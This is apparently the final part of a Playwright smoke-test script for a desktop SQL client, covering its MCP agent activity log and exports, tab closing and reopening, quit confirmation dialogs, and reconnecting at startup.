  await events.getByRole("row").filter({ hasText: "select count(*) as n from product" }).getByText("OK").waitFor();
  await events.getByRole("row").filter({ hasText: "insert into product" }).getByText("Refused").waitFor();
  await events.getByText("alter user bob password '***'").waitFor();
  assert.ok(!(await mcp.innerText()).includes("hunter2"), "a password never shows");
  await shot("mcp-activity");
  await mcp.getByLabel("Status").selectOption("refused");
  await mcp.getByRole("status").filter({ hasText: "2 events" }).waitFor();
  await mcp.getByLabel("Status").selectOption("");
  await mcp.getByLabel("Tool").selectOption("run_query");
  await mcp.getByRole("status").filter({ hasText: "1 event" }).waitFor();
  await mcp.getByLabel("Tool").selectOption("");
  await mcp.getByRole("searchbox", { name: "Search statements" }).fill("ALTER USER");
  await mcp.getByRole("status").filter({ hasText: "1 event" }).waitFor();
  await mcp.getByRole("searchbox", { name: "Search statements" }).fill("");
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  // Export: the core writes it, secrets masked and no cell read as a formula.
  const csvPath = join(userDir, "activity.csv");
  await page.evaluate((path) => { window.__spelaionSavePath = path; }, csvPath);
  await mcp.getByRole("button", { name: "Export CSV" }).click();
  await mcp.getByText("4 events exported to", { exact: false }).waitFor();
  const activityCsv = readFileSync(csvPath, "utf8");
  assert.ok(activityCsv.startsWith("time,session,client,connection,tool,statement,status,rows,duration_ms,detail\n"), activityCsv);
  assert.ok(activityCsv.includes(",smoke-agent,shop,execute_write,alter user bob password '***',refused,"), activityCsv);
  assert.ok(!activityCsv.includes("hunter2"), activityCsv);
  const jsonPath = join(userDir, "activity.json");
  await page.evaluate((path) => { window.__spelaionSavePath = path; }, jsonPath);
  await mcp.getByRole("button", { name: "Export JSON" }).click();
  await mcp.getByText(`4 events exported to ${jsonPath}`, { exact: false }).waitFor();
  assert.equal(JSON.parse(readFileSync(jsonPath, "utf8")).length, 4);
  await page.evaluate(() => { delete window.__spelaionSavePath; });
  // Sessions: the agent's process, opening into its calls.
  await mcp.getByRole("tab", { name: "Sessions" }).click();
  const sessions = mcp.getByRole("table", { name: "Sessions" });
  await sessions.getByRole("row").filter({ hasText: "smoke-agent" }).getByText("4 calls").waitFor();
  await sessions.getByRole("row").filter({ hasText: "smoke-agent" }).getByRole("button", { name: "Show calls" }).click();
  await mcp.getByText("Calls of the smoke-agent session", { exact: false }).waitFor();
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  // Clear: confirmed, done by the core, and recorded.
  await mcp.getByRole("button", { name: "Clear", exact: true }).click();
  const clearDialog = page.getByRole("dialog", { name: "Clear the MCP activity?" });
  await clearDialog.getByRole("button", { name: "Cancel" }).click();
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  await mcp.getByRole("button", { name: "Clear", exact: true }).click();
  await clearDialog.getByRole("button", { name: "Clear the log" }).click();
  await mcp.getByText("4 events cleared.").waitFor();
  await mcp.getByRole("status").filter({ hasText: "1 event" }).waitFor();
  await events.getByText("Log cleared").waitFor();
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await mcp.waitFor({ state: "detached" });

  step("tabs: close all, then close others asks once for a transaction and a running query, keeps pinned tabs, and reopen brings tabs back disconnected");
  {
    const tabs = page.locator(".tabbar .tab");
    const activeTab = page.locator(".tabbar .tab.active");
    const shown = page.locator(".tab-panel:not([hidden])");
    const labels = () => page.locator(".tabbar .tab .tab-label").allInnerTexts();
    const rename = async (name) => {
      await page.keyboard.press("Control+F2");
      const input = activeTab.locator("input.tab-rename");
      await input.fill(name);
      await input.press("Enter");
      await input.waitFor({ state: "detached" });
    };
    // Close all (Ctrl+Shift+W); a tab left with a transaction or a running query would ask.
    await page.keyboard.press("Control+Shift+W");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0 || document.querySelector('[role="dialog"] .modal-actions .danger'));
    if (await tabs.count() > 0) await page.locator('[role="dialog"] .modal-actions .danger').click();
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0);
    // A transaction open, a query running, a pinned tab, and the tab whose others close.
    const txPanel = await newQuery("Shop (SQLite)", "create temp table close_tx (x);");
    await run(txPanel);
    await txPanel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
    await txPanel.locator(".transaction-controls").getByRole("checkbox", { name: "Auto-commit" }).click();
    await txPanel.locator(".transaction-controls input[type=checkbox]:not(:checked)").waitFor();
    await replaceQuery(txPanel, "insert into close_tx values (1);");
    await run(txPanel);
    await txPanel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
    await rename("Open transaction");
    const longSql = "with recursive close_cancel_marker(i) as (select 1 union all select i + 1 from close_cancel_marker) select count(*) from close_cancel_marker;";
    const runPanel = await newQuery("Shop (SQLite)", longSql);
    await run(runPanel);
    await activeTab.locator(".tab-running").waitFor();
    await rename("Long query");
    await newQuery("Shop (SQLite)", "select 'pinned';");
    await rename("Pinned");
    await page.keyboard.press("Control+Alt+p");
    await page.locator('.tabbar .tab.active[data-pinned="true"]').waitFor();
    await newQuery("Shop (SQLite)", "select 'kept';");
    await rename("Kept");
    assert.deepEqual(await labels(), ["Pinned", "Open transaction", "Long query", "Kept"]);
    // Close others from the menu: one question names both tabs; Cancel closes nothing.
    await activeTab.click({ button: "right" });
    await page.getByRole("menu", { name: "Actions for Kept" }).getByRole("menuitem", { name: /^Close others/ }).click();
    const closeOthers = page.getByRole("dialog", { name: "Close with an open transaction?" });
    await closeOthers.getByText("the server rolls back what was not committed", { exact: false }).waitFor();
    assert.deepEqual(await closeOthers.locator(".open-transaction-list li").allInnerTexts(), ["Open transaction"]);
    assert.deepEqual(await closeOthers.locator(".running-list li").allInnerTexts(), ["Long query"]);
    await shot("12a-close-others-asks");
    await closeOthers.getByRole("button", { name: "Cancel", exact: true }).click();
    await closeOthers.waitFor({ state: "detached" });
    assert.equal(await tabs.count(), 4);
    assert.equal(await page.locator(".tabbar .tab-running").count(), 1, "the query still runs");
    // Ctrl+Alt+W asks the same; accepted, both close and the running query is cancelled.
    await page.keyboard.press("Control+Alt+w");
    await closeOthers.getByRole("button", { name: "Close and roll back" }).click();
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 2);
    assert.deepEqual(await labels(), ["Pinned", "Kept"]);
    assert.equal(await activeTab.locator(".tab-label").innerText(), "Kept");
    // The core recorded the closed tab's query as cancelled.
    if (!(await page.getByRole("complementary", { name: "Query history", exact: true }).isVisible())) {
      await page.getByRole("button", { name: "Query history", exact: true }).click();
    }
    const closedHistory = page.getByRole("complementary", { name: "Query history", exact: true });
    await closedHistory.getByRole("textbox", { name: "Search query history" }).fill("close_cancel_marker");
    await waitForHistoryCount(1);
    await closedHistory.getByText("Error details", { exact: true }).click();
    await closedHistory.locator(".history-error", { hasText: "Query cancelled" }).waitFor();
    await page.getByRole("button", { name: "Close query history" }).click();
    // Reopen (Ctrl+Shift+T): back in place, with name, SQL and connection; disconnected,
    // without results or transaction, and nothing runs.
    await page.keyboard.press("Control+Shift+T");
    assert.equal(await activeTab.locator(".tab-label").innerText(), "Open transaction");
    await activeTab.locator(".dot-disconnected").waitFor();
    assert.equal(await activeTab.locator(".tab-tx").count(), 0);
    assert.equal(await shown.locator(".cm-content").innerText(), "insert into close_tx values (1);");
    assert.equal(await shown.locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
    assert.equal(await shown.locator(".grid-host").count(), 0);
    await page.keyboard.press("Control+Shift+T");
    assert.equal(await activeTab.locator(".tab-label").innerText(), "Long query");
    assert.equal(await shown.locator(".cm-content").innerText(), longSql);
    await page.waitForTimeout(300);
    assert.equal(await activeTab.locator(".tab-running").count(), 0, "a reopened tab runs nothing");
    await activeTab.locator(".dot-disconnected").waitFor();
    assert.deepEqual(await labels(), ["Pinned", "Open transaction", "Long query", "Kept"]);
    // Close all leaves the pinned tab; its own Ctrl+W still closes it.
    await page.keyboard.press("Control+Shift+W");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 1);
    assert.deepEqual(await labels(), ["Pinned"]);
    await shot("12b-close-all-keeps-pinned");
    await page.keyboard.press("Control+w");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0);
  }

  // The next start connects the restored tab (checked after quitting, below).
  await withSettings("editor", async (settings) => {
    await settings.getByRole("checkbox", { name: "Reconnect the last connections at startup" }).check();
    await page.waitForFunction(() => document.querySelector('input[name="reconnectOnStart"]')?.checked && !document.querySelector('input[name="reconnectOnStart"]').disabled);
  });
  step("quitting or opening another folder with unapplied row edits or a running query asks first; Cancel keeps everything");
  {
    const shown = page.locator(".tab-panel:not([hidden])");
    const activeTab = page.locator(".tabbar .tab.active");
    const setThemeKeepingDialog = (theme) => page.evaluate((value) => { document.documentElement.dataset.theme = value; }, theme);
    const shotBoth = async (name) => {
      await shot(`${name}-light`);
      await setThemeKeepingDialog("dark");
      await shot(`${name}-dark`);
      await setThemeKeepingDialog("light");
    };
    // A row edit typed in a query's results and not applied.
    await newQuery("Shop (SQLite)", "select id, name from customer order by id limit 5;");
    await run(shown);
    await shown.locator(".statusline", { hasText: "5 rows" }).waitFor();
    await shown.getByRole("button", { name: "Add row" }).waitFor();
    const box = await shown.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 34 + 12);
    const cell = shown.locator("input.cell-editor").and(shown.getByRole("textbox", { name: "New value for name" }));
    await cell.fill("quit_pending_edit");
    await cell.press("Enter");
    await shown.getByText("Updated: 1", { exact: false }).waitFor();
    const editTab = await activeTab.locator(".tab-label").innerText();
    // The window's close button: the UI asks. Another close request while it asks keeps the app.
    requestClose(app.pid);
    const quitEdits = page.getByRole("dialog", { name: "Quit with unsaved row changes?" });
    await quitEdits.waitFor();
    assert.deepEqual(await quitEdits.locator(".unsaved-edits-list li").allInnerTexts(), [editTab]);
    await quitEdits.getByRole("button", { name: "Quit and discard" }).waitFor();
    await shotBoth("11c-quit-unsaved-edits");
    requestClose(app.pid);
    await page.waitForTimeout(1_000);
    assert.equal(app.exitCode, null, "a second close request while the UI asks keeps the app");
    await quitEdits.getByRole("button", { name: "Cancel", exact: true }).click();
    await quitEdits.waitFor({ state: "detached" });
    assert.equal(app.exitCode, null, "Cancel keeps the app open");
    await shown.getByText("Updated: 1", { exact: false }).waitFor();
    // Opening another folder asks the same before changing anything; Cancel keeps this one.
    const otherFolder = join(userDir, "other-folder");
    mkdirSync(otherFolder, { recursive: true });
    await page.evaluate((target) => (window.__spelaionOpenFolder = target), otherFolder);
    await page.getByTitle("Open another folder").click();
    const folderEdits = page.getByRole("dialog", { name: "Open another folder with unsaved row changes?" });
    await folderEdits.waitFor();
    assert.deepEqual(await folderEdits.locator(".unsaved-edits-list li").allInnerTexts(), [editTab]);
    await folderEdits.getByRole("button", { name: "Open and discard" }).waitFor();
    await shotBoth("11d-open-folder-unsaved-edits");
    await folderEdits.getByRole("button", { name: "Cancel", exact: true }).click();
    await folderEdits.waitFor({ state: "detached" });
    await page.evaluate(() => delete window.__spelaionOpenFolder);
    await shown.getByText("Updated: 1", { exact: false }).waitFor();
    await activeTab.locator(".dot-connected").waitFor();
    await page.locator('.connection-row:has-text("Shop (SQLite)")').waitFor();
    // A query running in another tab: one question names both tabs, and Cancel stops nothing.
    await newQuery("Shop (SQLite)", "with recursive quit_spin(i) as (select 1 union all select i + 1 from quit_spin) select count(*) from quit_spin;");
    await run(shown);
    await activeTab.locator(".tab-running").waitFor();
    const runTab = await activeTab.locator(".tab-label").innerText();
    requestClose(app.pid);
    const quitRunning = page.getByRole("dialog", { name: "Quit while a query runs?" });
    await quitRunning.waitFor();
    assert.deepEqual(await quitRunning.locator(".running-list li").allInnerTexts(), [runTab]);
    assert.deepEqual(await quitRunning.locator(".unsaved-edits-list li").allInnerTexts(), [editTab]);
    await quitRunning.getByRole("button", { name: "Quit and cancel" }).waitFor();
    await shotBoth("11e-quit-running-and-unsaved");
    await quitRunning.getByRole("button", { name: "Cancel", exact: true }).click();
    await quitRunning.waitFor({ state: "detached" });
    assert.equal(app.exitCode, null, "Cancel keeps the app open");
    await page.waitForTimeout(300);
    await activeTab.locator(".tab-running").waitFor();
    // Leave nothing pending: cancel the query, discard the edit and close both tabs.
    await shown.getByRole("button", { name: "Cancel", exact: true }).click();
    await activeTab.locator(".tab-running").waitFor({ state: "detached" });
    await page.keyboard.press("Control+w");
    await page.locator(".tabbar .tab", { hasText: editTab }).click();
    await page.locator(".tabbar .tab.active", { hasText: editTab }).waitFor();
    await shown.getByText("Updated: 1", { exact: false }).waitFor();
    await shown.getByRole("button", { name: "Discard" }).click();
    await shown.getByText("Updated: 1", { exact: false }).waitFor({ state: "detached" });
    await page.keyboard.press("Control+w");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0);
  }

  step("quitting with a transaction open asks first: Cancel keeps the app, the dialog quits");
  const quitPanel = await newQuery("Shop (SQLite)", "create temp table quit_tx (x);");
  await run(quitPanel);
  await quitPanel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
  await quitPanel.locator(".transaction-controls").getByRole("checkbox", { name: "Auto-commit" }).click();
  await quitPanel.locator(".transaction-controls input[type=checkbox]:not(:checked)").waitFor();
  await replaceQuery(quitPanel, "insert into quit_tx values (1);");
  await run(quitPanel);
  await quitPanel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  // The window's close button (WM_CLOSE): the core holds the window and the UI asks.
  requestClose(app.pid);
  const quitOpen = page.getByRole("dialog", { name: "Quit with an open transaction?" });
  await quitOpen.waitFor();
  await shot("11b-quit-open-transaction");
  await quitOpen.getByRole("button", { name: "Cancel", exact: true }).click();
  await quitOpen.waitFor({ state: "detached" });
  assert.equal(app.exitCode, null, "Cancel keeps the app open");
  requestClose(app.pid);
  const exitedOnQuit = once(app, "exit");
  await page.getByRole("dialog", { name: "Quit with an open transaction?" }).getByRole("button", { name: "Quit and roll back" }).click();
  await Promise.race([exitedOnQuit, new Promise((_, reject) => setTimeout(() => reject(new Error("the app did not quit")), 15_000))]);

  step("reconnect at startup (Settings › Editor): the restored tab connects, and nothing runs");
  await browser.close().catch(() => {});
  app = startApp();
  browser = await connect();
  page = browser.contexts()[0].pages()[0];
  page.setDefaultTimeout(30_000);
  await page.locator(".tabbar .tab .dot-connected").waitFor();
  assert.equal(await page.locator(".tabbar .tab").count(), 1);
  const reconnected = page.locator(".tab-panel:not([hidden])");
  assert.equal(await reconnected.locator(".cm-content").innerText(), "insert into quit_tx values (1);");
  await page.waitForTimeout(500);
  assert.equal(await reconnected.locator(".grid-host").count(), 0, "connecting ran nothing");
  assert.equal(await page.locator(".tabbar .tab-tx").count(), 0, "no transaction was opened");
  assert.equal(await reconnected.getByText("Statement 1", { exact: false }).count(), 0);

  step("quitting with nothing pending closes at once; with the UI frozen, a second close request quits");
  {
    const quitWithin = (exited, ms, what) =>
      Promise.race([exited, new Promise((_, reject) => setTimeout(() => reject(new Error(what)), ms))]);
    // A connected tab and nothing to lose: no question, the app exits.
    const exitedAtOnce = once(app, "exit");
    requestClose(app.pid);
    await quitWithin(exitedAtOnce, 10_000, "the app did not quit with nothing pending");
    await browser.close().catch(() => {});
    app = startApp();
    browser = await connect();
    page = browser.contexts()[0].pages()[0];
    page.setDefaultTimeout(30_000);
    await page.locator(".tabbar .tab .dot-connected").waitFor();
    // A page script that never yields: the UI cannot answer. The first request waits for it,
    // the second quits.
    void page.evaluate(() => { for (;;) {} }).catch(() => undefined);
    await new Promise((r) => setTimeout(r, 500));
    const exitedFrozen = once(app, "exit");
    requestClose(app.pid);
    await new Promise((r) => setTimeout(r, 2_000));
    assert.equal(app.exitCode, null, "the first close request waits for the UI");
    requestClose(app.pid);
    await quitWithin(exitedFrozen, 15_000, "a second close request did not quit a frozen UI");
  }

  console.log(`\nOK. Screenshots in ${shots}`);
} catch (e) {
  if (e === editSmokeComplete) console.log("\nOK. Editing smoke test passed.");
  else if (e === untilComplete) console.log(`\nOK. Smoke test passed up to "${process.env.SPELAION_E2E_UNTIL}".`);
  else {
    failed = true;
    console.error("\nFAILED:", e);
    try {
      await browser.contexts()[0].pages()[0].screenshot({ path: join(shots, "failure.png") });
    } catch {}
  }
} finally {
  writeFileSync(shopFile, shopOriginal);
  // A copy the run made in the demo repository, if a failure left it behind.
  for (const copy of ["mysql-copy.toml", "mysql-copy-2.toml"]) rmSync(join(demo, ".spelaion", "connections", "docker", copy), { force: true });
  await browser.close().catch(() => {});
  await stopApp();
  // WebView2 lets go of its profile (inside userDir) a moment after the app exits.
  try {
    rmSync(userDir, { recursive: true, force: true, maxRetries: 40, retryDelay: 250 });
  } catch (e) {
    console.warn(`could not remove ${userDir}: ${e.message}`);
  }
  process.exit(failed ? 1 : 0);
}
